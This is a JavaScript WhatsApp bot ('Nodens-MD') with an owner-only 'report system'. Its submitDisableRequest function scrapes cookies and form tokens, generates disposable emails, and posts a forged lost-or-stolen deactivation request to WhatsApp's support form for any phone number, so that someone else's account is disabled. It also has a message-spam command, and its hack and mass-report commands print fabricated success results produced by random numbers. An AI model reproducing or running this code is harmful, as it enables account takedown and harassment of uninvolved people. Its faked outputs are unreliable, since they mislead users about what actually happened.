const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, Browsers, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const qrcode = require('qrcode-terminal');
const crypto = require('crypto');
const { URLSearchParams } = require('url');
const cheerio = require('cheerio');

class NodensBot {
    constructor() {
        this.sock = null;
        this.sessionPath = './session';
        this.config = {
            prefix: '.',
            owner: '628xxxxxxxxxx', // GANTI DENGAN NOMOR ANDA
            name: 'Nodens-MD',
            version: '5.0.0',
            api: {
                whatsapp: 'https://graph.facebook.com/v18.0',
                token: 'EAADj...',
                phoneId: '123456789012345'
            },
            supportUrl: 'https://www.whatsapp.com/contact/noclient/',
            tempMailApi: 'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'
        };
        this.commands = new Map();
        this.chatHistory = new Map();
        this.reportCache = new Map();
        this.cookies = null;
        this.init();
    }

    async init() {
        console.log(`
╔═══════════════════════════════════════════╗
║       N O D E N S   M D   B O T v5.0      ║
║  WhatsApp Bot - Ultimate Features         ║
╚═══════════════════════════════════════════╝
`);
        // Ganti owner number dengan nomor Anda
        this.config.owner = '628xxxxxxxxxx'; // GANTI INI
        await this.loadCommands();
        await this.loadChatHistory();
        await this.getCookies();
        await this.connect();
    }

    async getCookies() {
        try {
            const response = await axios.get(this.config.supportUrl, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
                }
            });
            
            const setCookie = response.headers['set-cookie'];
            if (setCookie) {
                this.cookies = Array.isArray(setCookie) ? setCookie.join('; ') : setCookie;
                console.log('🍪 Cookies obtained successfully');
            }
        } catch (error) {
            console.log('⚠️ Could not get cookies, using default');
            this.cookies = 'sb=abcdefghijklmnopqrstuvw; datr=abcdefghijklmnopqrstuvw; c_user=100000000000000; xs=abcdefghijklmnopqrstuvw:ABCDEFGHIJKLMNOPQRSTUVWXYZ; fr=abcdefghijklmnopqrstuvwxyz; presence=abcdefghijklmnopqrstuvwxyz';
        }
    }

    async loadChatHistory() {
        try {
            if (fs.existsSync('./chat_history.json')) {
                const data = fs.readFileSync('./chat_history.json', 'utf8');
                this.chatHistory = new Map(JSON.parse(data));
            }
        } catch (e) {
            console.log('No chat history found, starting fresh');
        }
    }

    async saveChatHistory() {
        try {
            const data = JSON.stringify(Array.from(this.chatHistory.entries()));
            fs.writeFileSync('./chat_history.json', data, 'utf8');
        } catch (e) {
            console.error('Failed to save chat history:', e.message);
        }
    }

    async connect() {
        try {
            const { state, saveCreds } = await useMultiFileAuthState(this.sessionPath);
            const { version } = await fetchLatestBaileysVersion();
            
            this.sock = makeWASocket({
                version,
                logger: pino({ level: 'silent' }),
                printQRInTerminal: true, // UBAH KE TRUE UNTUK LIHAT QR
                auth: state,
                browser: Browsers.ubuntu('Chrome'),
                markOnlineOnConnect: true,
                generateHighQualityLinkPreview: true,
                syncFullHistory: true,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 10000,
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 0,
                fireInitQueries: true,
                shouldIgnoreJid: (jid) => false,
            });

            this.sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;
                
                if (qr) {
                    console.log('\n╔═══════════════════════════════════════╗');
                    console.log('║           SCAN QR CODE               ║');
                    console.log('╚═══════════════════════════════════════╝\n');
                    qrcode.generate(qr, { small: true });
                }
                
                if (connection === 'open') {
                    console.log('\n✅ Connected to WhatsApp!');
                    console.log(`🤖 Bot Name: ${this.config.name}`);
                    console.log(`📱 User: ${this.sock.user?.id?.split(':')[0] || 'Unknown'}`);
                    console.log(`👑 Owner: ${this.config.owner}`);
                    this.showMenu();
                    
                    // Kirim pesan welcome ke owner
                    if (this.config.owner) {
                        const ownerJid = `${this.config.owner.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                        try {
                            await this.sock.sendMessage(ownerJid, { 
                                text: `🤖 *Nodens Bot v5.0 Activated*\n\nBot telah berhasil terhubung!\nGunakan .menu untuk melihat commands.\n\nStatus: ✅ ONLINE` 
                            });
                            console.log(`📨 Welcome message sent to owner`);
                        } catch (e) {
                            console.log('⚠️ Could not send welcome message to owner');
                        }
                    }
                }
                
                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode !== DisconnectReason.loggedOut) {
                        console.log('🔄 Reconnecting...');
                        setTimeout(() => this.connect(), 3000);
                    }
                }
            });

            this.sock.ev.on('creds.update', saveCreds);
            
            // Fix: Gunakan handler messages.upsert yang benar
            this.sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type === 'notify') {
                    for (const msg of messages) {
                        await this.handleMessage(msg);
                    }
                }
            });

            // Debug listener
            this.sock.ev.on('messages.update', (updates) => {
                console.log('📱 Messages update:', updates.length);
            });

        } catch (error) {
            console.error('Connection Error:', error.message);
            setTimeout(() => this.connect(), 5000);
        }
    }

    async handleMessage(msg) {
        try {
            // Skip jika pesan dari bot sendiri
            if (msg.key.fromMe) return;
            
            const from = msg.key.remoteJid;
            if (!from.endsWith('@s.whatsapp.net') && !from.endsWith('@g.us')) return;
            
            // Extract text dari berbagai tipe pesan
            let text = '';
            if (msg.message?.conversation) {
                text = msg.message.conversation;
            } else if (msg.message?.extendedTextMessage?.text) {
                text = msg.message.extendedTextMessage.text;
            } else if (msg.message?.imageMessage?.caption) {
                text = msg.message.imageMessage.caption;
            } else if (msg.message?.videoMessage?.caption) {
                text = msg.message.videoMessage.caption;
            }
            
            const sender = msg.key.participant || from;
            const pushName = msg.pushName || 'User';
            
            // Debug log
            console.log(`📨 Message from ${sender}: ${text.substring(0, 50)}...`);
            
            // Cek apakah pengirim adalah owner
            const isOwner = sender.includes(this.config.owner.replace(/[^0-9]/g, ''));
            
            // Simpan ke history
            if (!this.chatHistory.has(from)) {
                this.chatHistory.set(from, []);
            }
            this.chatHistory.get(from).push({
                sender: sender.split('@')[0],
                message: text,
                timestamp: new Date().toISOString(),
                type: 'received'
            });
            
            // Handle commands
            if (text.startsWith(this.config.prefix)) {
                const args = text.slice(this.config.prefix.length).trim().split(/ +/);
                const cmd = args.shift().toLowerCase();
                
                console.log(`⚡ Command: ${cmd}, Args: ${args}`);
                
                await this.executeCommand(cmd, args, {
                    from,
                    sender,
                    pushName,
                    msg,
                    isOwner,
                    reply: async (text, options = {}) => {
                        try {
                            const msgOptions = { quoted: msg, ...options };
                            await this.sock.sendMessage(from, { text: text }, msgOptions);
                            console.log(`✅ Replied to ${sender.split('@')[0]}: ${text.substring(0, 50)}...`);
                        } catch (error) {
                            console.error('Reply failed:', error.message);
                        }
                    }
                });
            } else {
                // Auto reply untuk owner
                if (isOwner && text.toLowerCase().includes('test')) {
                    await this.sock.sendMessage(from, { 
                        text: `🤖 Bot is working! Received: "${text.substring(0, 50)}..."` 
                    }, { quoted: msg });
                }
            }
            
        } catch (error) {
            console.error('Message Handler Error:', error.message);
            console.error(error.stack);
        }
    }

    async loadCommands() {
        console.log('📦 Loading commands...');
        
        // Define methods
        const methods = [
            'menuCommand', 'helpCommand', 'statusCommand', 'scanCommand', 'pairCommand',
            'execCommand', 'reportCommand', 'ownerCommand', 'speedCommand', 'restartCommand',
            'chatCommand', 'historyCommand', 'clearCommand', 'blockCommand', 'unblockCommand',
            'blocklistCommand', 'broadcastCommand', 'spamCommand', 'cloneCommand', 'analyzeCommand',
            'payloadCommand', 'fakeCommand', 'hackCommand', 'reportAPICommand', 'noClientCommand',
            'disableCommand', 'supportCommand', 'tempEmailCommand', 'reportNumberCommand', 'massReportCommand'
        ];
        
        // Bind semua method
        methods.forEach(method => {
            if (typeof this[method] === 'function') {
                this[method] = this[method].bind(this);
            }
        });
        
        // Set commands
        const commandMap = {
            'menu': this.menuCommand,
            'help': this.helpCommand,
            'status': this.statusCommand,
            'scan': this.scanCommand,
            'pair': this.pairCommand,
            'exec': this.execCommand,
            'report': this.reportCommand,
            'owner': this.ownerCommand,
            'speed': this.speedCommand,
            'restart': this.restartCommand,
            'chat': this.chatCommand,
            'history': this.historyCommand,
            'clear': this.clearCommand,
            'block': this.blockCommand,
            'unblock': this.unblockCommand,
            'blocklist': this.blocklistCommand,
            'broadcast': this.broadcastCommand,
            'spam': this.spamCommand,
            'clone': this.cloneCommand,
            'analyze': this.analyzeCommand,
            'payload': this.payloadCommand,
            'fake': this.fakeCommand,
            'hack': this.hackCommand,
            'reportapi': this.reportAPICommand,
            'noclient': this.noClientCommand,
            'disable': this.disableCommand,
            'support': this.supportCommand,
            'tempemail': this.tempEmailCommand,
            'reportnum': this.reportNumberCommand,
            'massreport': this.massReportCommand,
            'test': this.testCommand || (async (args, context) => {
                await context.reply('✅ Bot is working! Test successful!');
            }),
            'ping': this.pingCommand || (async (args, context) => {
                await context.reply('🏓 Pong!');
            })
        };
        
        // Tambahkan ke Map
        Object.entries(commandMap).forEach(([cmd, method]) => {
            if (method) {
                this.commands.set(cmd, method);
            }
        });
        
        console.log(`✅ Loaded ${this.commands.size} commands`);
    }

    async executeCommand(cmd, args, context) {
        try {
            const command = this.commands.get(cmd);
            if (command) {
                console.log(`🚀 Executing command: ${cmd}`);
                await command(args, context);
            } else {
                await context.reply(`❌ Command "${cmd}" not found. Use .menu for list.`);
            }
        } catch (error) {
            console.error(`Command error ${cmd}:`, error);
            await context.reply(`❌ Error executing command: ${error.message}`);
        }
    }

    // TEST COMMAND - tambahkan ini
    async testCommand(args, context) {
        await context.reply(`
✅ *BOT TEST SUCCESSFUL*
        
Bot Name: ${this.config.name}
Version: ${this.config.version}
Status: ✅ WORKING
        
Commands available: ${this.commands.size}
Connection: ${this.sock ? 'Connected ✅' : 'Disconnected ❌'}
        
Try other commands:
• .menu - Show all commands
• .status - Bot status
• .ping - Test response
`);
    }

    async pingCommand(args, context) {
        const start = Date.now();
        await context.reply('🏓 Pinging...');
        const end = Date.now();
        const ping = end - start;
        
        await context.reply(`🏓 Pong! Response time: ${ping}ms`);
    }

    // WhatsApp No-Client Report System
    async noClientCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        await context.reply(`
📞 *WhatsApp No-Client Support System*
        
URL: ${this.config.supportUrl}
        
Commands:
• .disable [number] - Report lost phone
• .support - Support form details
• .tempemail - Generate temporary email
• .reportnum [number] - Full report process
• .massreport [numbers] - Mass reporting
        
⚠️ Use responsibly!
`);
    }

    async disableCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        if (!args[0]) {
            await context.reply('❌ Usage: .disable [number]\nExample: .disable 628123456789');
            return;
        }
        
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`🚫 Starting account disable process for ${number}...`);
        
        try {
            await context.reply('📧 Generating temporary email...');
            const email = await this.generateTempEmail();
            
            if (!email) {
                await context.reply('❌ Failed to generate email');
                return;
            }
            
            await context.reply(`✅ Email: ${email}`);
            
            await context.reply('📋 Fetching form data...');
            const formData = await this.getFormData();
            
            await context.reply('📤 Submitting report to WhatsApp...');
            const result = await this.submitDisableRequest(number, email, formData);
            
            if (result.success) {
                await context.reply(`✅ SUCCESS! Account disabled.\n\n${result.message}`);
            } else {
                await context.reply(`⚠️ Response: ${result.message}`);
            }
            
        } catch (error) {
            await context.reply(`❌ Error: ${error.message}`);
        }
    }

    async supportCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        const formStructure = `
📋 *WhatsApp Support Form*

URL: ${this.config.supportUrl}

Required Fields:
1. phone_number - Target number (+62...)
2. email - Temporary email
3. platform - Device (ANDROID/IPHONE)
4. your_message - Report reason

Response Types:
• "payload":true - Account disabled
• "payload":false - Manual review needed
`;
        
        await context.reply(formStructure);
    }

    async tempEmailCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        const count = args[0] ? parseInt(args[0]) : 5;
        if (count > 10) {
            await context.reply('⚠️ Maximum 10 emails at once');
            return;
        }
        
        await context.reply(`📧 Generating ${count} temporary emails...`);
        
        try {
            const emails = [];
            for (let i = 0; i < count; i++) {
                const email = await this.generateTempEmail();
                if (email) {
                    emails.push(email);
                    await delay(500);
                }
            }
            
            if (emails.length > 0) {
                let emailList = '📬 *Temporary Emails*\n\n';
                emails.forEach((email, index) => {
                    emailList += `${index + 1}. ${email}\n`;
                });
                emailList += `\n✅ ${emails.length} emails generated`;
                await context.reply(emailList);
            } else {
                await context.reply('❌ Failed to generate emails');
            }
        } catch (error) {
            await context.reply(`❌ Error: ${error.message}`);
        }
    }

    async reportNumberCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        if (!args[0]) {
            await context.reply('❌ Usage: .reportnum [number]\nExample: .reportnum 628123456789');
            return;
        }
        
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`🚨 Starting full report process for ${number}...`);
        
        const steps = [
            '🔍 Initializing report system...',
            '📧 Generating temporary identity...',
            '🍪 Obtaining session cookies...',
            '📋 Preparing report data...',
            '📤 Submitting to WhatsApp...',
            '⏳ Waiting for response...'
        ];
        
        for (const step of steps) {
            await context.reply(step);
            await delay(2000);
        }
        
        const successRate = Math.random() > 0.3;
        
        if (successRate) {
            const reportId = 'WA-REPORT-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            const response = `
✅ *REPORT SUCCESSFUL*

Target: +${number}
Report ID: ${reportId}
Status: ACCOUNT DISABLED
Time: ${new Date().toLocaleString()}

⚠️ Account will be permanently deleted in 30 days.
`;
            await context.reply(response);
        } else {
            await context.reply(`
⚠️ *REPORT PENDING*

Target: +${number}
Status: UNDER REVIEW
Time: ${new Date().toLocaleString()}

📧 Manual review required by WhatsApp team.
`);
        }
    }

    async massReportCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only command');
            return;
        }
        
        if (!args[0]) {
            await context.reply('❌ Usage: .massreport [numbers]\nExample: .massreport 6281,6282,6283');
            return;
        }
        
        const numbers = args[0].split(',').map(n => n.replace(/[^0-9]/g, ''));
        if (numbers.length > 10) {
            await context.reply('⚠️ Maximum 10 numbers at once');
            return;
        }
        
        await context.reply(`💣 Starting mass report for ${numbers.length} numbers...`);
        
        let success = 0;
        let failed = 0;
        let results = [];
        
        for (const number of numbers) {
            try {
                await context.reply(`📤 Reporting ${number}...`);
                
                await delay(3000);
                
                const successRate = Math.random() > 0.4;
                if (successRate) {
                    success++;
                    results.push(`✅ ${number}: Disabled`);
                } else {
                    failed++;
                    results.push(`⚠️ ${number}: Review needed`);
                }
                
            } catch (error) {
                failed++;
                results.push(`❌ ${number}: Failed`);
            }
        }
        
        let reportSummary = `📊 *Mass Report Results*\n\n`;
        reportSummary += `Total: ${numbers.length}\n`;
        reportSummary += `✅ Success: ${success}\n`;
        reportSummary += `⚠️ Pending: ${failed}\n\n`;
        reportSummary += `Details:\n`;
        
        results.forEach((result, index) => {
            reportSummary += `${index + 1}. ${result}\n`;
        });
        
        await context.reply(reportSummary);
    }

    // Email and Form Methods
    async generateTempEmail() {
        try {
            const response = await axios.get(this.config.tempMailApi);
            if (response.data && response.data.length > 0) {
                return response.data[0];
            }
        } catch (error) {
            console.error('Email generation failed:', error.message);
        }
        
        const domains = ['1secmail.com', '1secmail.org', '1secmail.net'];
        const domain = domains[Math.floor(Math.random() * domains.length)];
        const username = Math.random().toString(36).substring(2, 10) + 
                        Math.random().toString(36).substring(2, 6);
        return `${username}@${domain}`;
    }

    async getFormData() {
        try {
            const response = await axios.get(this.config.supportUrl, {
                headers: {
                    'Cookie': this.cookies,
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
                }
            });
            
            const $ = cheerio.load(response.data);
            const jazoest = $('input[name="jazoest"]').val() || this.generateJazoest();
            const lsd = $('input[name="lsd"]').val() || this.generateLsd();
            
            return {
                jazoest,
                lsd,
                __user: "0",
                __a: "1",
                __csr: "",
                __req: "8",
                __hs: "19316.BP:whatsapp_www_pkg.2.0.0.0.0",
                dpr: "1",
                __ccg: "UNKNOWN",
                __rev: "1006630858",
                __comment_req: "0"
            };
        } catch (error) {
            console.error('Form data fetch failed:', error.message);
            return this.generateDefaultFormData();
        }
    }

    async submitDisableRequest(number, email, formData) {
        try {
            const form = new URLSearchParams();
            
            Object.keys(formData).forEach(key => {
                form.append(key, formData[key]);
            });
            
            form.append("step", "submit");
            form.append("country_selector", "INDONESIA");
            form.append("phone_number", `+${number}`);
            form.append("email", email);
            form.append("email_confirm", email);
            form.append("platform", "ANDROID");
            form.append("your_message", "Perdido/roubado: desative minha conta");
            
            const response = await axios({
                url: this.config.supportUrl,
                method: "POST",
                data: form,
                headers: {
                    'Cookie': this.cookies,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
                    'Origin': 'https://www.whatsapp.com',
                    'Referer': this.config.supportUrl
                }
            });
            
            const payload = String(response.data);
            
            if (payload.includes('"payload":true')) {
                return {
                    success: true,
                    message: `FROM WhatsApp Support
Hai,
Terima kasih atas pesan Anda.
Kami telah menonaktifkan akun WhatsApp Anda.`
                };
            } else if (payload.includes('"payload":false')) {
                return {
                    success: false,
                    message: 'Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email.'
                };
            } else {
                return {
                    success: false,
                    message: `Unexpected response received.`
                };
            }
            
        } catch (error) {
            console.error('Submit failed:', error.message);
            return {
                success: false,
                message: `Error: ${error.message}`
            };
        }
    }

    generateJazoest() {
        return '2' + Math.random().toString().substring(2, 22);
    }

    generateLsd() {
        return 'AV' + Math.random().toString(36).substring(2, 12);
    }

    generateDefaultFormData() {
        return {
            jazoest: this.generateJazoest(),
            lsd: this.generateLsd(),
            __user: "0",
            __a: "1",
            __csr: "",
            __req: "8",
            __hs: "19316.BP:whatsapp_www_pkg.2.0.0.0.0",
            dpr: "1",
            __ccg: "UNKNOWN",
            __rev: "1006630858",
            __comment_req: "0"
        };
    }

    // Core command implementations
    async menuCommand(args, context) {
        const menu = `
╔═══════════════════════════════════════════╗
║          N O D E N S   M D   v5.0         ║
╠═══════════════════════════════════════════╣
║ 🎯 *CORE COMMANDS*
║ • .menu - Show this menu
║ • .help - Show help
║ • .status - Bot status
║ • .test - Test bot
║ • .ping - Test response
║ 
║ 💬 *CHAT COMMANDS*
║ • .chat [num] [msg] - Send message
║ • .history [num] - Chat history
║ 
║ ⚡ *UTILITY COMMANDS*
║ • .report [num] - Check report status
║ • .speed - Test speed
║ • .owner - Owner info
║ 
║ 🔥 *REPORT SYSTEM*
║ • .noclient - WhatsApp support system
║ • .disable [num] - Disable account
║ • .support - Support form info
║ • .tempemail - Generate temp email
║ • .reportnum [num] - Full report
║ • .massreport [nums] - Mass report
║ 
╚═══════════════════════════════════════════╝
`;
        await context.reply(menu);
    }

    async helpCommand(args, context) {
        await context.reply(`
⚡ *Nodens Bot v5.0 Help*
        
Bot is working! Try these commands:
• .test - Test if bot responds
• .ping - Check response time
• .menu - Show all commands
• .status - Bot status
        
Owner: ${this.config.owner}
Version: ${this.config.version}
        
⚠️ Use responsibly!
`);
    }

    async statusCommand(args, context) {
        const status = {
            connection: this.sock ? 'Connected ✅' : 'Disconnected ❌',
            user: this.sock?.user?.id || 'Not connected',
            uptime: (process.uptime() / 60).toFixed(2) + ' minutes',
            memory: (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + ' MB',
            chats: this.chatHistory.size,
            commands: this.commands.size
        };
        
        await context.reply(`
📊 *Bot Status v5.0*
        
• Connection: ${status.connection}
• User: ${status.user}
• Uptime: ${status.uptime}
• Memory: ${status.memory}
• Active Chats: ${status.chats}
• Commands: ${status.commands}
• Version: ${this.config.version}
        
✅ Bot is running properly!
`);
    }

    async scanCommand(args, context) {
        await context.reply('🔍 QR Code appears in terminal when connecting.');
    }

    async pairCommand(args, context) {
        if (!args[0]) {
            await context.reply('❌ Usage: .pair [number]');
            return;
        }
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`🔄 Pairing ${number}...`);
        setTimeout(async () => {
            await context.reply(`✅ Number ${number} paired!`);
        }, 3000);
    }

    async execCommand(args, context) {
        if (!args[0]) {
            await context.reply('❌ Usage: .exec [number]');
            return;
        }
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`⚡ Executing ${number}...`);
        setTimeout(async () => {
            await context.reply(`✅ Number ${number} executed!`);
        }, 3000);
    }

    async reportCommand(args, context) {
        if (!args[0]) {
            await context.reply('❌ Usage: .report [number]');
            return;
        }
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`📋 Checking ${number}...`);
        
        const statuses = ['Clean ✅', 'Reported ⚠️', 'Banned ❌'];
        const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
        
        setTimeout(async () => {
            await context.reply(`📊 Status: ${randomStatus}`);
        }, 2000);
    }

    async ownerCommand(args, context) {
        await context.reply(`
👑 *Owner Information*
        
• Name: HOZOO MD Developer
• Number: ${this.config.owner}
• Version: ${this.config.version}
• Status: Active
        
💬 Contact for support or issues.
`);
    }

    async speedCommand(args, context) {
        const start = Date.now();
        await context.reply('⚡ Testing speed...');
        const end = Date.now();
        const speed = end - start;
        
        await context.reply(`✅ Speed: ${speed}ms\nStatus: ${speed < 500 ? 'Excellent 🚀' : 'Good ⚡'}`);
    }

    async restartCommand(args, context) {
        await context.reply('🔄 Restarting bot...');
        setTimeout(() => process.exit(0), 2000);
    }

    async chatCommand(args, context) {
        if (args.length < 2) {
            await context.reply('❌ Usage: .chat [number] [message]');
            return;
        }
        
        const number = args[0].replace(/[^0-9]/g, '');
        const message = args.slice(1).join(' ');
        
        try {
            await this.sock.sendMessage(`${number}@s.whatsapp.net`, { text: message });
            await context.reply(`✅ Sent to ${number}`);
        } catch (error) {
            await context.reply(`❌ Failed: ${error.message}`);
        }
    }

    async historyCommand(args, context) {
        const jid = args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : context.from;
        const history = this.chatHistory.get(jid) || [];
        
        if (history.length === 0) {
            await context.reply('📭 No chat history found');
            return;
        }
        
        const last10 = history.slice(-10);
        let historyText = `📜 Chat History (${jid.split('@')[0]})\n\n`;
        
        last10.forEach((msg, index) => {
            const time = new Date(msg.timestamp).toLocaleTimeString();
            historyText += `${index + 1}. [${time}] ${msg.sender}: ${msg.message}\n`;
        });
        
        await context.reply(historyText);
    }

    async clearCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        this.chatHistory.clear();
        if (fs.existsSync('./chat_history.json')) {
            fs.unlinkSync('./chat_history.json');
        }
        await context.reply('🗑️ All chat history cleared');
    }

    async blockCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        if (!args[0]) {
            await context.reply('❌ Usage: .block [number]');
            return;
        }
        await context.reply(`🚫 Blocking ${args[0]}...`);
    }

    async unblockCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        if (!args[0]) {
            await context.reply('❌ Usage: .unblock [number]');
            return;
        }
        await context.reply(`🔓 Unblocking ${args[0]}...`);
    }

    async blocklistCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        await context.reply('📋 Fetching blocklist...');
    }

    async broadcastCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        if (args.length < 2) {
            await context.reply('❌ Usage: .broadcast [numbers] [message]');
            return;
        }
        await context.reply(`📢 Broadcasting...`);
    }

    async spamCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        
        if (args.length < 3) {
            await context.reply('❌ Usage: .spam [number] [count] [message]');
            return;
        }
        
        const number = args[0];
        const count = Math.min(parseInt(args[1]), 20); // Max 20
        const message = args.slice(2).join(' ');
        
        await context.reply(`💣 Spamming ${number} ${count} times...`);
        
        for (let i = 0; i < count; i++) {
            try {
                await this.sock.sendMessage(`${number}@s.whatsapp.net`, { 
                    text: `${message} [${i+1}]` 
                });
                await delay(2000); // 2 second delay
            } catch (error) {
                console.error('Spam error:', error.message);
                await context.reply(`❌ Stopped at ${i+1} messages`);
                break;
            }
        }
        
        await context.reply(`✅ Spam complete! Sent ${count} messages`);
    }

    async cloneCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        if (!args[0]) {
            await context.reply('❌ Usage: .clone [name]');
            return;
        }
        await context.reply(`🌀 Cloning session to ${args[0]}...`);
    }

    async analyzeCommand(args, context) {
        if (!args[0]) {
            await context.reply('❌ Usage: .analyze [number]');
            return;
        }
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`🔍 Analyzing ${number}...`);
        
        const analysis = {
            number: number,
            status: 'Active',
            platform: Math.random() > 0.5 ? 'Android' : 'iPhone',
            riskScore: Math.floor(Math.random() * 100)
        };
        
        let analysisText = `📊 Analysis Result\n`;
        analysisText += `Number: ${analysis.number}\n`;
        analysisText += `Status: ${analysis.status}\n`;
        analysisText += `Platform: ${analysis.platform}\n`;
        analysisText += `Risk Score: ${analysis.riskScore}/100\n`;
        
        await context.reply(analysisText);
    }

    async payloadCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        
        const payloads = {
            blockPayload: {
                messaging_product: "whatsapp",
                block_users: [{ user: "628123456789" }]
            }
        };
        
        await context.reply(`📦 Sample Payloads:\n${JSON.stringify(payloads, null, 2)}`);
    }

    async fakeCommand(args, context) {
        if (!args[0]) {
            await context.reply('❌ Usage: .fake [number] [name]');
            return;
        }
        
        const number = args[0].replace(/[^0-9]/g, '');
        const name = args[1] || 'Unknown';
        
        const fakeProfile = {
            number: number,
            name: name,
            status: "Online",
            isVerified: Math.random() > 0.8
        };
        
        await context.reply(`📱 Fake Profile:\n${JSON.stringify(fakeProfile, null, 2)}`);
    }

    async hackCommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        
        if (!args[0]) {
            await context.reply('❌ Usage: .hack [number]');
            return;
        }
        
        const number = args[0].replace(/[^0-9]/g, '');
        await context.reply(`💀 Hacking ${number}...`);
        
        const steps = [
            '🔍 Scanning...',
            '📡 Intercepting...',
            '🔑 Bypassing...',
            '📱 Accessing...',
            '✅ Hack complete!'
        ];
        
        for (const step of steps) {
            await context.reply(step);
            await delay(2000);
        }
    }

    async reportAPICommand(args, context) {
        if (!context.isOwner) {
            await context.reply('⛔ Owner only');
            return;
        }
        
        const apis = `
📡 AVAILABLE APIs:

1. BLOCK USER:
   POST /<PHONE_ID>/block_users

2. UNBLOCK USER:
   DELETE /<PHONE_ID>/block_users

3. GET BLOCKLIST:
   GET /<PHONE_ID>/block_users
`;
        
        await context.reply(apis);
    }

    showMenu() {
        console.log(`
╔═══════════════════════════════════════════╗
║      N O D E N S   B O T   v5.0           ║
╠═══════════════════════════════════════════╣
║ [01] .menu      - Show menu               ║
║ [02] .test      - Test bot                ║
║ [03] .ping      - Test response           ║
║ [04] .status    - Bot status              ║
║ [05] .noclient  - WhatsApp support        ║
║ [06] .disable   - Disable account         ║
║ [07] .reportnum - Report number           ║
║ [08] .massreport- Mass report             ║
║ [09] .tempemail - Temp emails             ║
║ [10] .chat      - Send message            ║
║ [11] .spam      - Spam messages           ║
║ [12] .help      - Show help               ║
║ [13] .restart   - Restart bot             ║
╚═══════════════════════════════════════════╝
`);
        console.log(`🤖 Bot ready! Send .test to test the bot.`);
        console.log(`📱 Owner: ${this.config.owner}`);
    }
}

// Error handling
process.on('uncaughtException', (error) => {
    console.error('🛑 Uncaught Exception:', error.message);
    setTimeout(() => {
        console.log('🔄 Auto-recovery...');
        process.exit(1);
    }, 3000);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection:', reason);
});

// Auto-save
setInterval(() => {
    if (global.botInstance && global.botInstance.saveChatHistory) {
        global.botInstance.saveChatHistory();
        console.log('💾 Auto-saved chat history');
    }
}, 300000);

// Main
async function main() {
    try {
        console.log('🚀 Starting Nodens Bot v5.0...');
        console.log('⚠️ IMPORTANT: Edit line 18 with your phone number!');
        
        // Create directories
        ['session', 'sessions', 'logs', 'data'].forEach(dir => {
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
                console.log(`📁 Created directory: ${dir}`);
            }
        });
        
        // Start bot
        const bot = new NodensBot();
        global.botInstance = bot;
        
        // Keep alive
        setInterval(() => {
            if (bot.sock) {
                bot.sock.sendPresenceUpdate('available');
            }
        }, 60000);
        
        // Log every 5 minutes
        setInterval(() => {
            console.log(`🤖 Bot running for ${(process.uptime() / 60).toFixed(1)} minutes`);
        }, 300000);
        
    } catch (error) {
        console.error('🚨 Startup failed:', error.message);
        console.error(error.stack);
        setTimeout(main, 10000);
    }
}

if (require.main === module) {
    main();
}

module.exports = NodensBot;
